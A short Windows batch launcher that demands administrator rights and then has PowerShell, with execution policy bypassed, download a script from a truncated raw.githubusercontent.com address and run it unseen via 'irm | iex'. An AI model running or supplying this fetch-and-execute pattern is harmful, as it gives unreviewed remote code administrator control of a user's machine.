@echo off

REM This batch file should be run with administrator privileges.

:: Check if running as administrator

net session >nul 2>&1

if %errorLevel% neq 0 (
    echo You need to run this script as an administrator.
    pause
    exit /b
)

:: Run the PowerShell command with administrator privileges

powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://raw.githubusercontent.com/' | iex"

:: Pause to keep the window open
::pause
